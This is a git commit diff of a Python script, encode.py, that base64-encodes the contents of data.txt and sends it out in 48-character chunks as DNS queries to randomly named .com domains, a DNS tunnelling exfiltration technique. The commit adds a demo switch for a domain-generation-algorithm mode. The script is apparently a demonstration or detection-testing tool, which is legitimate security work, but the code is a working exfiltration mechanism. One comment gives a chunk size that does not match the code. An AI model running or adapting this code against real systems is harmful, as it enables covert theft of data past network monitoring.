82b92edb782589c362efc583df2b37e72f7d333c
Kevin West <kwest1@gmail.com>
2020-07-09 12:40:30 -0700

    v1.2

--- encode.py
+++ encode.py
@@ -1,5 +1,4 @@
 
-
 import base64 
 import socket
 import dns.resolver
@@ -12,21 +11,33 @@ def randStr(chars = string.ascii_lowercase, N=10):
 dns.resolver.Timeout = 1
 dns.resolver.lifetime = 1
 
+
 DOMAIN = "." + randStr(N=10) + ".com"
+DEMO = "TUNNEL" #Set to TUNNEL or DGA
+
 
 data = open('data.txt', 'rb') #open binary file in read mode
 data_read = data.read()
 encodedBytes = base64.b64encode(data_read)
 encodedStr = str(encodedBytes, "utf-8") #converts Base64 to string from bytes
 
-parse = [encodedStr[i:i+24] for i in range(0, len(encodedStr), 24)] #breaks the base64 text file into 24 character chunks and passes to parse
+parse = [encodedStr[i:i+48] for i in range(0, len(encodedStr), 48)] #breaks the base64 text file into 32 character chunks and passes to parse
 
 ctr = 0
 for chunk in parse:
     try:
-        print(dns.resolver.query(parse[ctr]+DOMAIN)) #query DNS Domain
+        if DEMO == "TUNNEL":
+            print(dns.resolver.query(parse[ctr]+DOMAIN, "A")) #query DNS Domain
+        elif DEMO == "DGA":
+            print(dns.resolver.query(randStr(N=3) + "." + randStr(N=10) + ".com", "A"))
     except (dns.resolver.NoAnswer):
-        print("Couldn't find any records (NoAnswer)") #Error handling on Timeout
+        if DEMO == "TUNNEL":
+            print("Couldn't find any records (NoAnswer): "+ parse[ctr]+DOMAIN, "A") #Error handling on Timeout
+        elif DEMO == "DGA":
+            print("Couldn't find any records (NoAnswer): "+ randStr(N=3) + "." + randStr(N=10) + ".com", "A")
     except (dns.resolver.NXDOMAIN):
-        print("Couldn't find any records (NXDOMAIN): " + parse[ctr]+DOMAIN) #Error handling if DNS is cached on host and cant find.
+        if DEMO == "TUNNEL":
+            print("Couldn't find any records (NXDOMAIN): " + parse[ctr]+DOMAIN) #Error handling if DNS is cached on host and cant find.
+        elif DEMO == "DGA":
+            print("Couldn't find any records (NXDOMAIN): " + randStr(N=3) + "." + randStr(N=10) + ".com", "A")
     ctr = ctr + 1
